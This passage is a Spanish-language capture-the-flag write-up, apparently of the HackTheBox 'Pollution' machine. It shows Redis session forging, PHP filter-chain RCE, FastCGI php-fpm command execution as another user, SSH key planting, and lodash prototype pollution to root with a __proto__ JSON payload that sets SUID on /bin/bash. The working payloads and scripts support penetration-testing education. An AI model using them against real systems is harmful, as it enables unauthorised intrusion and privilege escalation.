    <meta http-equiv="X-UA-Compatible" content="IE=edge">                                                                                                     
    <meta name="viewport" content="width=device-width, initial-scale=1.0">                                                                                    
    <script src="assets/js/tailwind.js"></script>                                                                                                             
    <title>Developers Collect</title>                                                                                                                         
</head>                                                                                                                                                       
                                                                                                                                                              
<body>                                                                                                                                                        
    <div class="flex flex-col h-screen justify-between">                                                                                                      
        <?php include("header.php"); ?>                                                                                                                       
                                                                                                                                                              
        <main class="mb-auto mx-24">                                                                                                                          
            <?php include($_GET['page'] . ".php"); ?>                                                                                                         
        </main>                                                                                                                                               
                                                                                                                                                              
        <?php include("footer.php"); ?>                                                                                                                       
    </div>                                                                                                                                                    
                                                                                                                                                              
</body>                                                                                                                                                       
                                                                                                                                                              
</html>
```

Me llamo la atención el `bootstrap.php` ya que este fichero se suele utilizar para las configuraciones de los sitios web.

```php
<?php

ini_set('session.save_handler', 'redis');
ini_set('session.save_path', 'tcp://localhost:6379/?auth=COLLECTR3D1SPASS');

session_start();
```

Y encontramos una credencial, `COLLECTR3D1SPASS` para Redis.

## Redis Enumeration

Ahora sí podemos enumerar la base de datos y encontramos las sesiones de PHP.
```console
$ redis-cli -h collect.htb -a 'COLLECTR3D1SPASS'
Warning: Using a password with '-a' or '-u' option on the command line interface may not be safe.
collect.htb:6379> KEYS *
 1) "PHPREDIS_SESSION:m0quph73em3qeca9hg2av3rc7f"
 2) "PHPREDIS_SESSION:uk385rcqv86ahs4qnurg2lv1om"
 3) "PHPREDIS_SESSION:laage9fp959sb1180a5d59ke4i"
 4) "PHPREDIS_SESSION:27fh9h6veirelvouv815rul4tg"
 5) "PHPREDIS_SESSION:8umh0m236krvrfasiohqdj0enf"
 6) "PHPREDIS_SESSION:gi2c1krg228jkg5gpvv9pibog4"
 7) "PHPREDIS_SESSION:e37ci4tqvukr5smlk0ag3nhe4a"
 8) "PHPREDIS_SESSION:0hj293g5q32fvoac9rcreb2b8q"
 9) "PHPREDIS_SESSION:e1e17g7n3lr1lkr6e1r33ahhoh"
10) "PHPREDIS_SESSION:4ecp461nu7058h53fk2uaf7gg0"
11) "PHPREDIS_SESSION:jn6i7957ed7e65vh91sdd9j32h"
12) "PHPREDIS_SESSION:lvi3jme0lcp7tsh7gt0hpspo2q"
13) "PHPREDIS_SESSION:vk5hsi53v31rgahqqojnkckbaj"
14) "PHPREDIS_SESSION:bqo7rapb9ms4lle4aga9prug1h"
15) "PHPREDIS_SESSION:eurvh0scasvcsp2blnsqe3056r"
16) "PHPREDIS_SESSION:ug8tndvfhr2fjl28h70l1aqj0p"
17) "PHPREDIS_SESSION:5f9iatasmdvjr6o9c8a1tjeuks"
```

Todas las keys estaban vacias, todas excepto una, la mia.
```console
collect.htb:6379> get PHPREDIS_SESSION:gi2c1krg228jkg5gpvv9pibog4
"username|s:7:\"pointed\";role|s:5:\"admin\";"
```

`"username|s:7:\"pointed\";role|s:5:\"admin\";"`: El valor de la sesión serializada. Es un string que contiene los siguientes datos:

- `username|s:7:\"pointed\";`: Esto indica que hay un campo llamado `username` con un string de longitud 7 cuyo valor es `"pointed"`.
- `role|s:5:\"admin\";`: Esto indica que hay un campo llamado `role` con un string de longitud 5 cuyo valor es `"admin"`.

## Modifying PHP Serialized Session
Mi misión es poder autenticarme en el panel de usuario del `developers.collect.htb` entonces tengo que buscar la forma de hacer eso.

Viendo el `index.php` vemos un condicional al principio de todo el archivo.
```php
if (!isset($_SESSION['auth']) or $_SESSION['auth'] != True) {
    die(header('Location: /login.php'));
}
```

Entonces si en nuestra sesión encuentra que `auth`no existe o no vale `Verdadero` nos manda pastar.

Pero como tenemos acceso al Redis, podríamos modificar nuestra sesión y establecer un campo `auth` que valga `True`

Así que podemos serializar el objeto de mi usuario pero haciendo ese cambio.
```console
$ php -a
Interactive shell

php > $session = array("username" => "pointed", "role" => "admin", "auth" => True);
php > echo serialize($session);
a:3:{s:8:"username";s:7:"pointed";s:4:"role";s:5:"admin";s:4:"auth";b:1;}
```

Cambiamos la información de la sesión.
```console
collect.htb:6379> set PHPREDIS_SESSION:gi2c1krg228jkg5gpvv9pibog4 '{s:8:"username";s:7:"pointed";s:4:"role";s:5:"admin";s:4:"auth";b:1;}'
OK
collect.htb:6379> get PHPREDIS_SESSION:gi2c1krg228jkg5gpvv9pibog4
"{s:8:\"username\";s:7:\"pointed\";s:4:\"role\";s:5:\"admin\";s:4:\"auth\";b:1;}"
```

Pero al recargar la página me sigue llevando al inicio de sesión.

Esto es porque estoy modificando la sesión de `collect.htb` y no de `developers.collect.htb`
![Write-up Image](images/Screenshot_24.png)

Al recuperar la sesión vemos que está vacia.
```console
collect.htb:6379> get PHPREDIS_SESSION:vu38kfnsn9meo80emfihttpiki
""
```

En redis:
- Las cadenas (`string`) se representan como `s:{length}:"{value}";`.
- Los valores booleanos (`true` o `false`) se representan como `b:1;` para `true` y `b:0;` para `false`.

Por lo cual si establecemos:
`"auth|b:1;"`: Agrega el nuevo campo `auth` y lo establece en `True` (`b:1`).

Modificamos esta vez la sesión correcta.
```console
collect.htb:6379> set PHPREDIS_SESSION:vu38kfnsn9meo80emfihttpiki 'auth|b:1;'
OK
collect.htb:6379> get PHPREDIS_SESSION:vu38kfnsn9meo80emfihttpiki
"auth|b:1;"
```

Y al recargar la página ahora si que ganamos acceso.
![Write-up Image](images/Screenshot_25.png)

## Abusing PHP `filter` Wrapper to get RCE -> Foothold
Me llama la atención el parámetro `page`, y como tenemos el código fuente vamos a analizarlo.

```php
<main class="mb-auto mx-24">
            <?php include($_GET['page'] . ".php"); ?>
        </main>
```

Podríamos intentar un LFI o incluso RCE a través de algunos wrappers.

Encontramos [este artículo en HackTricks](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-php-filters)

Nos recomienda [este repo de Github](https://github.com/synacktiv/php_filter_chain_generator) para generar nuestras cadenas de filtros PHP para conseguir RCE sin subir archivo ni nada.

Nos clonamos el repo.
```console
$ git clone https://github.com/synacktiv/php_filter_chain_generator
Cloning into 'php_filter_chain_generator'...
remote: Enumerating objects: 11, done.
remote: Counting objects: 100% (11/11), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 11 (delta 4), reused 10 (delta 4), pack-reused 0 (from 0)
Receiving objects: 100% (11/11), 5.23 KiB | 5.23 MiB/s, done.
Resolving deltas: 100% (4/4), done.
```

Y con el parámetro `--chain` podemos especificar cual es el código PHP que queremos que se ejecute.
```console
$ python3 php_filter_chain_generator.py --chain '<?php echo "ou yesyesyesyes"; ?>'
[+] The following gadget chain will generate the following code : <?php echo "ou yesyesyesyes"; ?> (base64 value: PD9waHAgZWNobyAib3UgeWVzeWVzeWVzeWVzIjsgPz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF
.....
```

El "churro" nos lo podemos copiar y pegar en el parámetro `page` y si todo sale bien debería de salir el texto `ou yesyesyesyes`

¡Bingo!
![Write-up Image](images/Screenshot_26.png)

Ahora vamos a ganar RCE.
Vamos a crear un payload para poder ejecutar comandos mediante el párametro `c`
```console
$ python3 php_filter_chain_generator.py --chain '<?php shell_exec($_GET["c"]); ?>'
```

Si lo copiamos vemos que no sale nada.
![Write-up Image](images/Screenshot_27.png)

Si intentamos ejecutar el comando `id` vemos que sale texto no legible por pantalla, pero como ahora sale algo y antes no quiero pensar que el comando se está ejecutando.
![Write-up Image](images/Screenshot_28.png)

![Write-up Image](images/Screenshot_29.png)

Si nos mandamos un ping vemos que nos llega, por lo cual podemos confirmar que tenemos RCE.
```console
$ sudo tcpdump -i tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:07:34.336987 IP forum.collect.htb > 10.10.14.104: ICMP echo request, id 57132, seq 1, length 64
21:07:34.337042 IP 10.10.14.104 > forum.collect.htb: ICMP echo reply, id 57132, seq 1, length 64
```

Ahora nos podemos mandar la shell con el típico one-liner.
![Write-up Image](images/Screenshot_30.png)

Y si estamos en escucha con `pwncat-cs` por el puerto 443.
```console
$ sudo pwncat-cs -lp 443
[21:09:52] Welcome to pwncat 🐈!                                                                                                                                                                                               __main__.py:164
[21:10:04] received connection from 10.129.228.126:35744                                                                                                                                                                            bind.py:84
[21:10:07] 10.129.228.126:35744: registered new host w/ db                                                                                                                                                                      manager.py:957
(local) pwncat$                                                                                                                                                                                                                               
(remote) www-data@pollution:/var/www/developers$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## User Pivoting
Vemos que existe un usuario `victor`
```console
(remote) www-data@pollution:/var/www/developers$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
victor:x:1002:1002::/home/victor:/bin/bash
```

Como sabemos que probablemente exista otra base de datos detrás podemos confirmar que servicios internos están abiertos.
```console
(remote) www-data@pollution:/var/www/collect$ netstat -tulnp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:9000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 ::1:6379                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:38829           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -                   
udp6       0      0 :::5353                 :::*                                -                   
udp6       0      0 :::42859                :::*                                -       
```

Y vemos el puerto 3000 interno que ya sabíamos que existía.

El puerto 3306 (MySQL) por lo cual efectivamente, existe otra base de datos detrás.

Y otro puerto 9000 que no sabemos que servicio ofrece.

En `/var/www/collect/config.php` podemos encontrar la contraseña de la base de datos de MySQL.
```console
(remote) www-data@pollution:/var/www/collect$ cat config.php                                                    
<?php                                                                                                           
                                                                                                                
                                                                                                                
return [                                                                                                        
    "db" => [                                                                                                   
        "host" => "localhost",                                                                                  
        "dbname" => "webapp",                                                                                   
        "username" => "webapp_user",                                                                            
        "password" => "Str0ngP4ssw0rdB*12@1",                                                                   
        "charset" => "utf8"                                                                                     
    ],                                                                                                          
];  
```

Podemos ingresar en la base de atos con las credenciales `webapp_user:Str0ngP4ssw0rdB*12@1`

```console
(remote) www-data@pollution:/var/www/collect$ mysql -uwebapp_user -pStr0ngP4ssw0rdB*12@1
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 364
Server version: 10.5.15-MariaDB-0+deb11u1 Debian 11

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| developers         |
| forum              |
| information_schema |
| mysql              |
| performance_schema |
| pollution_api      |
| webapp             |
+--------------------+
7 rows in set (0.002 sec)
```

Encontramos un hash MD5 en `developers -> users`
```console
MariaDB [developers]> select * from users;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | c89efc49ddc58ee4781b02becc788d14 |
+----+----------+----------------------------------+
```

Encontramos mas hashes en `forum -> mybb_users`
```console
MariaDB [forum]> select username,password from mybb_users;
+---------------------+----------------------------------+
| username            | password                         |
+---------------------+----------------------------------+
| administrator_forum | b254efc2c5716af2089ffeba1abcbf30 |
| john                | e1ec52d73242b78fdee6be117569b602 |
| victor              | b454fd07d44b27f1d528efba841c9717 |
| sysadmin            | 477a429cddfc475b9100958cae9204b1 |
| jeorge              | 5d13d9d4b1f368280b8426800a85702e |
| lyon                | 5eab3ec757f8352597ab74361fda8bcc |
| jane                | 972470c4c1a3f53029e56007abcf39fc |
| karldev             | 285127d01d188c8827c9fded33bf6f9e |
| pointed             | 3eb5e8b03d5fa8228ea1bef4821a170c |
+---------------------+----------------------------------+
9 rows in set (0.000 sec)
```

Encontramos otro hash en `webapp -> users`
```console
MariaDB [webapp]> select * from users;
+----+----------+----------------------------------+-------+
| id | username | password                         | role  |
+----+----------+----------------------------------+-------+
|  1 | admin    | c89efc49ddc58ee4781b02becc788d14 | admin |
|  3 | pointed  | c416671d05d001fca2433d9855e3c905 | admin |
+----+----------+----------------------------------+-------+
```

El hash de `admin` es el mismo que habíamos encontrado antes.

No conseguí crackear ninguno de estos hashes.
```console
$ cat hashes.txt 
c89efc49ddc58ee4781b02becc788d14
b254efc2c5716af2089ffeba1abcbf30
e1ec52d73242b78fdee6be117569b602
b454fd07d44b27f1d528efba841c9717
477a429cddfc475b9100958cae9204b1
5d13d9d4b1f368280b8426800a85702e
5eab3ec757f8352597ab74361fda8bcc
972470c4c1a3f53029e56007abcf39fc
285127d01d188c8827c9fded33bf6f9e
3eb5e8b03d5fa8228ea1bef4821a170c
```

## Linpeas
Podemos probar a ejecutar `linpeas.sh`, nos lo subimos utilizando la función `upload` la cual es interna de `pwncat-cs`

```console
(local) pwncat$ upload /opt/peas/linpeas.sh
./linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 862.8/862.8 kB • ? • 0:00:00
[21:23:17] uploaded 862.78KiB in 3.01 seconds     
```

Encontramos que `victor` está ejecutando `php-fpm`, esto ya lo he tocado en otras máquinas.
![Write-up Image](images/Screenshot_31.png)

Encontramos el archivo de configuración `/etc/php/8.1/fpm/php-fpm.conf`
```console
(remote) www-data@pollution:/tmp$ ps aux | grep php-fpm
root         964  0.0  1.0 265400 41132 ?        Ss   10:45   0:00 php-fpm: master process (/etc/php/8.1/fpm/php-fpm.conf)
victor      1011  0.0  0.3 265840 15916 ?        S    10:45   0:00 php-fpm: pool victor
victor      1012  0.0  0.3 265840 15916 ?        S    10:45   0:00 php-fpm: pool victor
www-data    2239  0.0  0.9 345740 35960 ?        S    11:01   0:01 php-fpm: pool www
www-data    2241  0.0  0.9 345748 36228 ?        S    11:01   0:01 php-fpm: pool www
www-data    2242  0.0  0.9 345888 36672 ?        S    11:01   0:00 php-fpm: pool www
www-data   22739  0.0  0.0   3268   636 pts/0    S+   13:27   0:00 grep php-fpm

```
## Abusing FastCGI PHP-FPM
Ahora que sabemos que existe FastCGI por el proceso que hemos descubierto, podemos suponer que el puerto 9000 corresponde a este servicio ya que es el puerto que utiliza por defecto.

Podemos utilizar [este script](https://book.hacktricks.xyz/network-services-pentesting/9000-pentesting-fastcgi) que encontramos en HackTricks para intentar ejecutar comandos como `victor`
```bash
#!/bin/bash

PAYLOAD="<?php echo '<!--'; system('whoami'); echo '-->';"
FILENAMES="/var/www/public/index.php" # Exisiting file path

HOST=$1
B64=$(echo "$PAYLOAD"|base64)

for FN in $FILENAMES; do
    OUTPUT=$(mktemp)
    env -i \
      PHP_VALUE="allow_url_include=1"$'\n'"allow_url_fopen=1"$'\n'"auto_prepend_file='data://text/plain\;base64,$B64'" \
      SCRIPT_FILENAME=$FN SCRIPT_NAME=$FN REQUEST_METHOD=POST \
      cgi-fcgi -bind -connect $HOST:9000 &> $OUTPUT

    cat $OUTPUT
done
```

Vamos a reemplazar `FILENAMES` a algún archivo que exista.
![Write-up Image](images/Screenshot_32.png)

Y vamos a cambiar el comando para mandarnos un ping a nuestra máquina.
![Write-up Image](images/Screenshot_33.png)

Y vemos que el ping se realiza.
```console
(remote) www-data@pollution:/tmp$ ./rce.sh 
Status: 302 Found
Set-Cookie: PHPSESSID=6p00qrfhf7ff4384i1n0ok3bfo; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!--PING 10.10.14.104 (10.10.14.104) 56(84) bytes of data.
64 bytes from 10.10.14.104: icmp_seq=1 ttl=63 time=36.2 ms

--- 10.10.14.104 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 36.215/36.215/36.215/0.000 ms
```

Ejecutando el comando `id` vemos que esto lo está ejecutando `victor`.
```console
(remote) www-data@pollution:/tmp$ ./rce.sh 
Status: 302 Found
Set-Cookie: PHPSESSID=03id86eq019mtl0iao9ng06c02; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!--uid=1002(victor) gid=1002(victor) groups=1002(victor)
```

Ahora modificarnos el comando para enviarnos una consola.
![Write-up Image](images/Screenshot_34.png)

Pero vemos que la consola instantáneamente se cierra ya que el proceso ejecuta el comando y al matarlo no mantiene la reverse shell.
```console
$ sudo pwncat-cs -lp 443
/usr/local/lib/python3.11/dist-packages/paramiko/transport.py:178: CryptographyDeprecationWarning: Blowfish has been deprecated and will be removed in a future release
  'class': algorithms.Blowfish,
[21:37:49] Welcome to pwncat 🐈!                                                                                         __main__.py:164
[21:37:51] received connection from 10.129.228.126:56510                                                                      bind.py:84
[21:37:51] connection failed: channel unexpectedly closed       
```

Así que como está el SSH abierto vamos a ver si tiene una clave privada, y si no, escribiremos nuestra clave pública en su `authorized_keys` para poder autenticarnos como `victor` utilizando la autenticación de clave privada.
![Write-up Image](images/Screenshot_35.png)

Y vemos que no tiene ninguna clave privada.
```console
(remote) www-data@pollution:/tmp$ ./rce.sh 
Status: 302 Found
Set-Cookie: PHPSESSID=l8ta9cm3c30sbk2uelcblgv9uj; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8

<!--total 8
drwx------  2 victor victor 4096 Nov 21  2022 .
drwx------ 16 victor victor 4096 Nov 21  2022 ..
```

Entonces en nuestra máquina nos copiamos nuestra clave pública a un fichero `authorized_keys`
```console
$ cp /home/pointedsec/.ssh/id_rsa.pub authorized_keys
```

Lo subimos a la máquina víctima en `/tmp/authorized_keys`

Cambiamos el comando para que se borra por si existe y luego se copie en `/home/victor/.ssh/authorized_keys`
![Write-up Image](images/Screenshot_37.png)

Vemos que todo sale bien.
```console
(remote) www-data@pollution:/tmp$ ./rce.sh    
Status: 302 Found
Set-Cookie: PHPSESSID=m2jbmpkgf15vaireq1o7auje6s; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /login.php
Content-type: text/html; charset=UTF-8
```

Y ya podemos ganar una sesión SSH como `victor`
```console
$ ssh victor@10.129.228.126 -i /home/pointedsec/.ssh/id_rsa 
Linux pollution 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
victor@pollution:~$ id
uid=1002(victor) gid=1002(victor) groups=1002(victor)
```

Y leer la flag de usuario.
```console
victor@pollution:~$ cat user.txt 
ed53db85449dae....
```

# Privilege Escalation
Encontramos en el directorio personal de `victor` un directorio `pollution_api`
```console
victor@pollution:~/pollution_api$ ls -la
total 116
drwxr-xr-x  8 victor victor  4096 Nov 21  2022 .
drwx------ 16 victor victor  4096 Nov 21  2022 ..
drwxr-xr-x  2 victor victor  4096 Nov 21  2022 controllers
drwxr-xr-x  2 victor victor  4096 Nov 21  2022 functions
-rw-r--r--  1 victor victor   528 Sep  2  2022 index.js
-rwxr-xr-x  1 victor victor   574 Aug 26  2022 log.sh
drwxr-xr-x  5 victor victor  4096 Nov 21  2022 logs
drwxr-xr-x  2 victor victor  4096 Nov 21  2022 models
drwxr-xr-x 97 victor victor  4096 Nov 21  2022 node_modules
-rw-r--r--  1 victor victor 71730 Aug 26  2022 package-lock.json
-rw-r--r--  1 victor victor   160 Aug 26  2022 package.json
drwxr-xr-x  2 victor victor  4096 Nov 21  2022 routes
```

Que quiero pensar que es la API de la que tanto se ha hablado que está en el puerto 3000.

Podemos comprobar que esta API la está ejecutando el usuario `root`
```console
victor@pollution:~/pollution_api$ ps -aux | grep pollution_api
root        1342  0.0  1.9 1664492 77332 ?       Sl   10:45   0:01 /usr/bin/node /root/pollution_api/index.js
victor     23505  0.0  0.0   6240   640 pts/0    S+   13:53   0:00 grep pollution_api
```

Vamos a pasarnos este proyecto a nuestra máquina para analizarlo en busca de vulnerabilidades.

Con `Snyk` podemos encontrar una versión desactualizada de `lodash` la cual es vulnerable a Prototype Pollution (el nombre de la máquina cuadra por lo cual los tiros deben de ir por aquí)
![Write-up Image](images/Screenshot_38.png)

Encontramos [este post de Snky que explica la vulnerabilidad](https://security.snyk.io/vuln/SNYK-JS-LODASHMERGE-173732)

> Affected versions of this package are vulnerable to Prototype Pollution. The functions `merge`, `mergeWith`, and `defaultsDeep` could be tricked into adding or modifying properties of `Object.prototype`. This is due to an incomplete fix to `CVE-2018-3721`.

En `controllers/Messages_send.js` vemos que se utiliza la función `merge` la cual es vulnerable.
![Write-up Image](images/Screenshot_39.png)

Para llegar a este endpoint necesitamos tener una cuenta de usuario. Eso es lo primero que debemos hacer.

Podemos crear una cuneta en el endponit `/auth/register`
![Write-up Image](images/Screenshot_40.png)

Podemos crear la cuenta perfectamente.
```console
victor@pollution:~$ curl -X POST http://127.0.0.1:3000/auth/register -H 'Content-Type: application/json' -d '{"username": "pointed", "password
{"Status":"Ok"}
```

Ahora necesitamos convertirnos en administradores, pero como tenemos acceso a la base de datos podemos hacer eso fácilmente.

Podemos ver el usuario recién creado.
```console
MariaDB [pollution_api]> select * from users;
+----+----------+----------+------+---------------------+---------------------+
| id | username | password | role | createdAt           | updatedAt           |
+----+----------+----------+------+---------------------+---------------------+
|  1 | test     | test     | user | 2024-09-13 15:37:12 | 2024-09-13 15:37:12 |
|  2 | pointed  | password | user | 2024-09-13 18:08:02 | 2024-09-13 18:08:02 |
+----+----------+----------+------+---------------------+---------------------+
```

Podemos cambiar el campo `role` para darnos rol de administrador.
```console
MariaDB [pollution_api]> update users set role="admin" where username="pointed";
Query OK, 1 row affected (0.003 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

```console
MariaDB [pollution_api]> select * from users;
+----+----------+----------+-------+---------------------+---------------------+
| id | username | password | role  | createdAt           | updatedAt           |
+----+----------+----------+-------+---------------------+---------------------+
|  1 | test     | test     | user  | 2024-09-13 15:37:12 | 2024-09-13 15:37:12 |
|  2 | pointed  | password | admin | 2024-09-13 18:08:02 | 2024-09-13 18:08:02 |
+----+----------+----------+-------+---------------------+---------------------+
```

Ahora debemos de saber como funciona el endpoint para mandar un mensaje.

Entonces vamos a intentar mandar un mensaje de prueba.
![Write-up Image](images/Screenshot_41.png)

Pero antes necesitamos un token de autenticación.
```console
victor@pollution:~$ curl -X POST http://127.0.0.1:3000/auth/login -H 'Content-Type: application/json' -d '{"username": "pointed", "password": "password"}'
{"Status":"Ok","Header":{"x-access-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicG9pbnRlZCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcyNjI1MTExNSwiZXhwIjoxNzI2MjU0NzE1fQ.xr0E3IWWzqlmMYFGAqo2XpHFk_5S87_3ITcSqawufSU"}}
```

Y ahora intentamos mandar un mensaje.
```console
victor@pollution:~$ curl -X POST http://127.0.0.1:3000/admin/messages/send -H 'Content-Type: application/json' -d '{"text": "test"}' -H "x-access-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoicG9pbnRlZCIsImlzX2F1dGgiOnRydWUsInJvbGUiOiJhZG1pbiIsImlhdCI6MTcyNjI1MTExNSwiZXhwIjoxNzI2MjU0NzE1fQ.xr0E3IWWzqlmMYFGAqo2XpHFk_5S87_3ITcSqawufSU"
{"Status":"Ok"}
```

Y podemos comprobar la base de datos para ver que todo ha salido bien.
```console
MariaDB [pollution_api]> select * from messages;
+----+--------------------------------------------------------------------+-----------+---------------------+---------------------+
| id | text                                                               | user_sent | createdAt           | updatedAt           |
+----+--------------------------------------------------------------------+-----------+---------------------+---------------------+
|  1 | {"user_sent":"pointed","title":"Message for admins","text":"test"} | pointed   | 2024-09-13 18:12:34 | 2024-09-13 18:12:34 |
+----+--------------------------------------------------------------------+-----------+---------------------+---------------------+
1 row in set (0.000 sec)
```

## Prototype Pollution 2 RCE Abusing `child_process` functions

Vemos que se está utilizando `exec` para ejecutar un comando.
![Write-up Image](images/Screenshot_42.png)

Podemos encontrar en [HackTricks](https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce) un PoC interesante.
```javascript
// environ trick - not working
// It's not possible to pollute the .env attr to create a first env var
// because options.env is null (not undefined)

// cmdline trick - working with small variation
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');

// stdin trick - not working
// Not using stdin

// Windows
// Working after kEmptyObject (fix)
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "\\\\127.0.0.1\\C$\\Windows\\System32\\calc.exe"
var proc = exec('something');
```

Entonces al llamar a la función `merge` como le está pasando el `req.body` sin filtrar nada puedo realizar el Prototype Pollution.

# Port Forwarding
Vamos a hacer port forwarding al puerto 3000 para trabajar mas fácilmente con burp.
```console
$ ssh -L 3000:127.0.0.1:3000 victor@10.129.228.126
```

## Exploiting Prototype Pollution
Siguiendo el PoC de HackTricks podemos traducir esto:
```javascript
const { exec } = require('child_process');
p = {}
p.__proto__.shell = "/proc/self/exe" //You need to make sure the node executable is executed
p.__proto__.argv0 = "console.log(require('child_process').execSync('touch /tmp/exec-cmdline').toString())//"
p.__proto__.NODE_OPTIONS = "--require /proc/self/cmdline"
var proc = exec('something');
```

En formato JSON para que lo procese el servidor.
![Write-up Image](images/Screenshot_43.png)

```json
{"text": "test",

"__proto__":{

"shell":  "/proc/self/exe",

"argv0": "console.log(require('child_process').execSync('touch /tmp/pwned_pointed').toString())//",

"NODE_OPTIONS":"--require /proc/self/cmdline"

}}
```

Si todo sale bien debería de crear un archivo en `/tmp/pwned_pointed` cuyo propietario sea `root`

Ahora si miramos `/tmp` encontramos el archivo.
![Write-up Image](images/Screenshot_45.png)

Ahora vamos a establecer el SUID de `/bin/bash` a 1 para poder lanzarnos una consola como `root` y escalar privilegios.
![Write-up Image](images/Screenshot_46.png)

Y ahora podemos comprobar que todo ha salido bien.
```console
victor@pollution:/tmp$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Y podemos lanzarnos una bash como el propietario con el parámetro `-p` y escalar privilegios.
```console
victor@pollution:/tmp$ bash -p
bash-5.1# id
uid=1002(victor) gid=1002(victor) euid=0(root) groups=1002(victor)
```

Podemos leer la flag de `root`
```console
bash-5.1# cat /root/root.txt 
16e136dfdebb50e1...
```

¡Y ya estaría!

Happy Hacking! 🚀